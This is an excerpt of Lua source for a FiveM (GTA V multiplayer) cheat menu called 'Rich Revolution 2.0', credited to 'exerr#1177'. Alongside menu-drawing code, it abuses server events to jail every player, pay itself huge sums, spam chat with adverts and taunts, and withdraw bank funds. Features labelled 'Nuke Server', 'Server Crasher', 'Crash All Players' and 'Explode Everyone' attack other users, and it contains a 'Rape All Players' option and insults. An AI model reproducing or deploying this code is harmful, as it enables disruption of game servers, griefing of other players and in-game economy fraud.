...
local chdata = {}
	...
	local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu","VRPMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
...
local function setMenuProperty(id, property, value)
    ...
    function RichRevolution.SetSpriteColor(id, r, g, b, a)
...
function RichRevolution.CreateMenu(id, title)
    menus[id] = { }
    ...
    menus[id].menuBackgroundColor = { r = 255, g = 102, b = 255, a = 155 }
...
function RichRevolution.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        RichRevolution.CreateMenu(id, menus[parent].title)
...
function RichRevolution.CurrentMenu()
    return currentMenu
end
...
function RichRevolution.IsMenuOpened(id)
    return isMenuVisible(id)
end


function RichRevolution.IsAnyMenuOpened()
...
function RichRevolution.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function RichRevolution.CloseMenu()
    if menus[currentMenu] then
...
function RichRevolution.Button(text, subText)
...
function RichRevolution.MenuButton(text, id)
    if menus[id] then
        if RichRevolution.Button(text) then
            setMenuVisible(currentMenu, false)
...
function RichRevolution.CheckBox(text, checked, callback)
    if RichRevolution.Button(text, checked and "~g~~h~On" or "~h~~c~Off") then
        checked = not checked
...
function RichRevolution.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if RichRevolution.Button(text, selectedItem) then
...
function RichRevolution.Display()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            RichRevolution.CloseMenu()
        else
...
function RichRevolution.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function RichRevolution.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function RichRevolution.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function RichRevolution.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function RichRevolution.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function RichRevolution.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function RichRevolution.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function RichRevolution.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function RichRevolution.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function RichRevolution.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function RichRevolution.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function RichRevolution.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function RichRevolution.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function RichRevolution.SetMenuButtonPressedSound(id, name, set)
                    ...
                    function()
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~Add me for more menus exerr#1177',
                                43161337
                            )
...
RCCar.Spawn = function()
    ...
    SetVehicleNumberPlateText(RCCar.Entity, "exerr#1177")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Rich Revolution")
        end
    ...
    function()
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'exerr#1177',
                    {0, 0x99, 255},
                    '/ooc Rich Revolution l discord.gg/qY3G4sc l your security is weak exerr#1177 the best developer l'
                )
                TriggerServerEvent('_chat:messageEntered', '^8exerr menu', {0, 0x99, 255}, '^Rich Revolution l discord.gg/qY3G4sc l your security is weak exerr#1177 the best developer l')
				else
			...
			if banallusers then
				for i = 0, 128 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60, "~r~Rich Revolution l discord.gg/qY3G4sc l your security is weak exerr#1177 the best developer l")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60, "~r~Rich Revolution l discord.gg/qY3G4sc l your security is weak exerr#1177 the best developer l")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~Rich Revolution l discord.gg/qY3G4sc l your security is weak exerr#1177 the best developer l")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~Rich Revolution l discord.gg/qY3G4sc l your security is weak exerr#1177 the best developer l")
					end
				end
      ...
      if IsControlPressed(0, 19) then
		...
		Deer.Destroy()
            ...
            if bifegfubffff then
			 ...
			 if rainbow then
                    local color = k(1.0)
                    for i = 0, #allMenus do
                        RichRevolution.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
                    end  
                    for i, dA in pairs(bd) do                 
                        RichRevolution.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
                    end
                ...
                if animated then                                   
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                RichRevolution.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
                            end
                            for i, dA in pairs(bd) do
                                RichRevolution.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                            ...
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                RichRevolution.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
                            end
                            for i, dA in pairs(bd) do
                                RichRevolution.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                            ...
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                RichRevolution.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
                            end
                            for i, dA in pairs(bd) do
                                RichRevolution.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                            ...
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                RichRevolution.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
                            end
                            for i, dA in pairs(bd) do
                                RichRevolution.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
		...
		if discordPresence then
                    SetDiscordAppId(678810359909318656)
            
                    SetDiscordRichPresenceAsset('Rich Revolution')
                    
					SetRichPresence('created by exerr#1177')
			
                    SetDiscordRichPresenceAssetText('Rich Revolution | Lol Fuck you')
                
                    SetDiscordRichPresenceAssetSmall('Rich Revolution')
            
                    SetDiscordRichPresenceAssetSmallText('EXERRTM ON YOUTUBE')
...
Citizen.CreateThread(
    function()
        ...
        RichRevolution.CreateMenu("MainMenu", "~g~Rich Revolution 2.0")
        RichRevolution.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		RichRevolution.CreateSubMenu("PedMenu", "SelfMenu", "Ped Menu")
        RichRevolution.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        RichRevolution.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        RichRevolution.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        RichRevolution.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
		RichRevolution.CreateSubMenu('LulxDJ', 'MaliciousMenu', 'ESP Menu')
        RichRevolution.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        RichRevolution.CreateSubMenu("SRVMenu", "MainMenu", "Server Options")
        RichRevolution.CreateSubMenu("SRVPMenu", "SRVMenu", "Polish Server")
        RichRevolution.CreateSubMenu("StrefaRP", "SRVPMenu", "StrefaRP")
        RichRevolution.CreateSubMenu("SRVGMenu", "SRVMenu", "Germany Server")
        RichRevolution.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        RichRevolution.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        RichRevolution.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        RichRevolution.CreateSubMenu("VRPMoneyMenu", "VRPMenu", "VRP Money Menu")
        RichRevolution.CreateSubMenu("VRPJailMenu", "VRPMenu", "VRP Jail")
        RichRevolution.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        RichRevolution.CreateSubMenu("ESXJailMenu", "ESXMenu", "ESX Jail")
        RichRevolution.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		RichRevolution.CreateSubMenu("Hedit", "VehMenu", "Handling")
	    RichRevolution.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
        RichRevolution.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		RichRevolution.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
        RichRevolution.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Vehicle types')
        RichRevolution.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Vehicle Options')
        RichRevolution.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        RichRevolution.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        RichRevolution.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
        RichRevolution.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        RichRevolution.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        RichRevolution.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        RichRevolution.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        RichRevolution.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        RichRevolution.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        RichRevolution.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        RichRevolution.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        RichRevolution.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        RichRevolution.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        RichRevolution.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        RichRevolution.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        RichRevolution.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
		RichRevolution.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
        RichRevolution.CreateSubMenu("performance", "LSC", "Performance Tuning")
        RichRevolution.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        RichRevolution.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        RichRevolution.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
		RichRevolution.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
        RichRevolution.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
		RichRevolution.CreateSubMenu("Credits", "SettingsMenu", "Credits")
for i, dA in pairs(bd) do 
                RichRevolution.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
                RichRevolution.CreateSubMenu("primary", dA.id, "Primary Paint") 
                RichRevolution.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
                RichRevolution.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
                RichRevolution.CreateSubMenu("classic1", "primary", "Classic Paint") 
                RichRevolution.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
                RichRevolution.CreateSubMenu("matte1", "primary", "Matte Paint") 
                RichRevolution.CreateSubMenu("metal1", "primary", "Metal Paint") 
                RichRevolution.CreateSubMenu("classic2", "secondary", "Classic Paint") 
                RichRevolution.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
                RichRevolution.CreateSubMenu("matte2", "secondary", "Matte Paint") 
                RichRevolution.CreateSubMenu("metal2", "secondary", "Metal Paint") 
                RichRevolution.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
                RichRevolution.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
                RichRevolution.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
                RichRevolution.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
            end 
        end
        for i, dA in pairs(be) do 
            RichRevolution.CreateSubMenu(dA.id, "performance", dA.name) 
        end
        ...
        local SelectedPlayer
            ...
            while Enabled do
                ...
                for i, dA in pairs(bd) do
                    if RichRevolution.IsMenuOpened("tunings") then
                        if b8 then
                            if ba == "neon" then 
                    ...
                    if RichRevolution.IsMenuOpened(dA.id) then
                        if dA.id == "wheeltypes" then
                            if RichRevolution.Button("Sport Wheels") then 
                                SetVehicleWheelType(veh, 0) 
                            elseif RichRevolution.Button("Muscle Wheels") then 
                                SetVehicleWheelType(veh, 1) 
                            elseif RichRevolution.Button("Lowrider Wheels") then 
                                SetVehicleWheelType(veh, 2) 
                            elseif RichRevolution.Button("SUV Wheels") then 
                                SetVehicleWheelType(veh, 3) 
                            elseif RichRevolution.Button("Offroad Wheels") then 
                                SetVehicleWheelType(veh, 4) 
                            elseif RichRevolution.Button("Tuner Wheels") then 
                                SetVehicleWheelType(veh, 5) 
                            elseif RichRevolution.Button("High End Wheels") then 
                                SetVehicleWheelType(veh, 7) 
                            end
                                
                            RichRevolution.Display() 
                        elseif dA.id == "extra" then 
                            ...
                            for i, dA in pairs(dF) do
                                ...
                                if RichRevolution.Button(dA.menuName, pricestring) then 
                        ...
                        elseif dA.id == "headlight" then
                            if RichRevolution.Button("None") then 
                            ...
                            for dK, dA in pairs(bo) do 
                                ...
                                if RichRevolution.Button(dA.name, pricetext) then
                                    if not bg then 
                                        bi = "headlight"
                                        bk = false
                        ...
                        elseif dA.id == "neon" then
                            ...
                            for i, dA in pairs(colors) do 
                                ...
                                if RichRevolution.Button(i, pricestring) then
                                    if not b8 then 
                                        ba = "neon"
                        ...
                        elseif dA.id == "paint" then
                            if RichRevolution.MenuButton("~r~→  ~s~Primary Paint", "primary") then 
                            elseif RichRevolution.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then 
                            elseif RichRevolution.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then 
                            end 
                            RichRevolution.Display()
                        else 
                            ...
                            for dG, dH in pairs(as) do
                                ...
                                if RichRevolution.Button(dH.menuName, price) then
                                    if not b8 then 
                                        ba = dA.id
            ...
            if RichRevolution.Button("Stock "..dA.name, pricestock) then 
                SetVehicleMod(veh, dA.id, -1) 
            elseif RichRevolution.Button(dA.name.." Upgrade 1", price1) then 
                SetVehicleMod(veh, dA.id, 0) 
            elseif RichRevolution.Button(dA.name.." Upgrade 2", price2) then 
                SetVehicleMod(veh, dA.id, 1) 
            elseif RichRevolution.Button(dA.name.." Upgrade 3", price3) then 
                SetVehicleMod(veh, dA.id, 2) 
            elseif dA.id ~= 13 and dA.id ~= 12 and RichRevolution.Button(dA.name.." Upgrade 4", price4) then 
                SetVehicleMod(veh, dA.id, 3) end; RichRevolution.Display() 
            end 
        end

            if RichRevolution.IsMenuOpened("MainMenu") then
                drawNotification("~h~~p~Rich ~p~Revolution ~s~2.0")
                drawNotification("~h~~s~The best dev: ~r~exerr#1177")
                if RichRevolution.MenuButton    ("~o~∑  ~s~Own options", "SelfMenu") then
                elseif RichRevolution.MenuButton("~g~∑  ~s~Online Players", "OnlinePlayersMenu") then
                elseif RichRevolution.MenuButton("~o~∑  ~s~Weapon Menu", "WeaponMenu") then
                elseif RichRevolution.MenuButton("~g~∑  ~s~Vehicle Menu", "VehMenu") then
                elseif RichRevolution.MenuButton("~o~∑  ~s~Extreme Menu", "MaliciousMenu") then
                elseif RichRevolution.MenuButton("~g~∑  ~s~Trolling Menu", "TrollMenu") then
                elseif RichRevolution.MenuButton("~o~∑  ~s~ESX Options", "ESXMenu") then
                elseif RichRevolution.MenuButton("~g~∑  ~s~VRP Options", "VRPMenu") then
                elseif RichRevolution.MenuButton("~o~∑  ~s~Server Options", "SRVMenu") then
				elseif RichRevolution.MenuButton("~g~∑  ~s~Settings", "SettingsMenu") then
                elseif RichRevolution.Button("~o~∑  ~s~Close The Menu  ") then
                    Enabled = false
                end

                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("SRVMenu") then
                if RichRevolution.MenuButton("~g~→  ~r~Polish ~s~Servers", "SRVPMenu") then
                elseif RichRevolution.MenuButton("~g~→  ~y~Germany ~s~Servers", "SRVGMenu") then
                end

                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("SRVPMenu") then
                if RichRevolution.MenuButton("~g~→  ~s~StrefaRP", "StrefaRP") then
                end

                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("VRPMenu") then
                if RichRevolution.MenuButton("~g~→  ~s~VRP Money Options", "VRPMoneyMenu") then
                elseif RichRevolution.MenuButton("~g~→  ~s~VRP Jail", "VRPJailMenu") then
                elseif RichRevolution.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
				elseif RichRevolution.Button("Give yourself 10x salary (VRP)") then
                ...
                elseif RichRevolution.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif RichRevolution.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif RichRevolution.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
                end

                RichRevolution.Display()
			                elseif RichRevolution.IsMenuOpened("SettingsMenu") then
                if RichRevolution.ComboBox("~g~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = selectedIndex
                    for i = 1, #allMenus do
                        RichRevolution.SetMenuX(allMenus[i], menuX[currentMenuX])
                    end
                    end) 
                    then
                elseif RichRevolution.ComboBox("~g~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = selectedIndex
                    for i = 1, #allMenus do
                        RichRevolution.SetMenuY(allMenus[i], menuY[currentMenuY])
                    end
                    end)
                    then
					elseif RichRevolution.MenuButton(" 📝  ~s~Information", "InfoMenu") then
                    elseif RichRevolution.MenuButton("🛒  ~s~Credits", "Credits") then
                    end
    
                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("InfoMenu") then
                    if RichRevolution.Button("Rich Revolution 2.0") then
					elseif RichRevolution.Button("~r~www.richmenu.pl") then
                    end
    
                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("Credits") then
				if     RichRevolution.Button("~h~Press on my nickname <3") then
				elseif RichRevolution.Button("∑  ~r~~h~exerr#1177~s~ - ~r~DEV") then
				drawNotification('~h~Contact him for More releases.')
				drawNotification('~h~Also contact him if you want to purchase any menu.')
				end
					
					RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("TrollMenu") then
                if RichRevolution.Button("ESX Server Crasher") then
                ...
                elseif  RichRevolution.CheckBox(
                    "VRP Server Crasher",
                    banallusers,
                    function(enabled)
                    banallusers = enabled
                ...
                then
                elseif RichRevolution.Button("Nuke Server") then
                    TriggerServerEvent("esx_truckerjob:pay", 9999999999)
                    nukeserver()
				elseif RichRevolution.Button("Esx Destroy V2") then
                    esxdestroyv2()
                elseif RichRevolution.Button("VRP Destroy V2") then
                    vrpdestroy()
                elseif RichRevolution.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif RichRevolution.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
                elseif RichRevolution.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif RichRevolution.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
                elseif RichRevolution.Button("Fake Message") then
                ...
                elseif RichRevolution.Button("Rape All Players") then
                    RapeAllFunc()
                elseif RichRevolution.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif RichRevolution.Button('Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            ...
                            AttachEntityToEntity(
                				...
                				elseif RichRevolution.Button("Spawn moutain Lion On Everyone") then
				...
				elseif RichRevolution.Button("SWAT Railgun On Everyone") then
                ...
                elseif RichRevolution.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif RichRevolution.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "mechanic", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "mecano", 3)
                    end
                end

                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("TeleportMenu") then
                if RichRevolution.Button("~b~TP~s~ To Your Waypoint") then
                    TeleportToWaypoint()
                elseif RichRevolution.Button("~b~TP~s~ Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif RichRevolution.Button("~b~TP~s~ To Coordinates") then
                    TeleportToCoords()
                elseif RichRevolution.CheckBox(
                ...
                RichRevolution.Display()
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "EXERR")
                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
                    end
                
                elseif RichRevolution.IsMenuOpened("VehMenu") then
                    if RichRevolution.Button("Remote Car") then
        ...
        RCCar.Start()
            ...
            elseif RichRevolution.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif RichRevolution.Button("Repair Engine Only") then
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
				...
				SetVehicleOilLevel(veh, 1000.0)
						...
						elseif RichRevolution.Button("~g~Buy vehicle for free (DON'T USE!)") then fv()
				elseif
					RichRevolution.CheckBox(
					"~s~~h~Ultra Speed",
					Nigubdddddd,
					function(enabled)
					Nigubdddddd = enabled
                ...
                then
                elseif RichRevolution.MenuButton('~g~→  ~s~Vehicle List', 'CarTypes') then
                elseif RichRevolution.MenuButton("~g~→  ~s~LS Customs", "LSC") then
                elseif RichRevolution.Button("Spawn A Custom Vehicle") then
					elseif
					RichRevolution.CheckBox(
					"~s~Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				...
				then
                 ...
                 then
                elseif RichRevolution.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif RichRevolution.Button("Delete Closest Vehicle") then
				...
				elseif
				 ...
				 then
				elseif RichRevolution.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
                ...
                then
				elseif RichRevolution.Button("Flip Up Vehicle") then
				local ped = GetPlayerPed(-1)
		        local veh = GetVehiclePedIsIn(ped)
	             FreezeEntityPosition(veh,false)
	             SetVehicleOnGroundProperly(veh)
	            SetVehicleEngineOn(veh, true)
				elseif RichRevolution.Button("Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now dirty")
				elseif RichRevolution.Button("Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now clean")
                end

                RichRevolution.Display()
			elseif RichRevolution.IsMenuOpened("tunings") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(bd) do
                        if dA.
                    id == "extra"
                    and# checkValidVehicleExtras()  ~= 0 then
                    if RichRevolution.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
                    then
                    if RichRevolution.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
                    then
                    if RichRevolution.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
                    then
                    if RichRevolution.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
                    then
                    if RichRevolution.MenuButton(dA.name, dA.id) then end
                    ...
                    if RichRevolution.Button("Xenon Headlight", xenonStatus) then
                    ...
                    RichRevolution.Display() 
                elseif RichRevolution.IsMenuOpened("performance") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(be) do
                        if RichRevolution.MenuButton(dA.name, dA.id) then 
                        end 
                    end
                    ...
                    if RichRevolution.Button("Turbo Tune", turboStatus) then
                    ...
                    end end; curprim, cursec = GetVehicleColours(veh) if RichRevolution.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; RichRevolution.Display() elseif RichRevolution.IsMenuOpened("metallic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; RichRevolution.Display() elseif RichRevolution.IsMenuOpened("metal1") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; RichRevolution.Display() elseif RichRevolution.IsMenuOpened("classic2") then
                    ...
                    end end; _, currims = GetVehicleExtraColours(veh) if RichRevolution.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    ...
                    RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("LSC") then
			local veh = GetVehiclePedIsUsing(PlayerPedId())
					if RichRevolution.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
		elseif RichRevolution.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
        elseif RichRevolution.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
                elseif RichRevolution.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                ...
                then
                elseif RichRevolution.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
                elseif RichRevolution.Button("Max Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif RichRevolution.Button("Max Performance") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                RichRevolution.Display()
		elseif RichRevolution.IsMenuOpened("Hedit") then
		if GetVehiclePedIsIn( PlayerPedId(), false ) ~= 0 then
						if RichRevolution.Button('Refresh Info') then
			...
			for i,theKey in pairs(chdata) do
				...
				if theKey.value and RichRevolution.Button(theKey.name, theKey.value) then 
		...
		RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
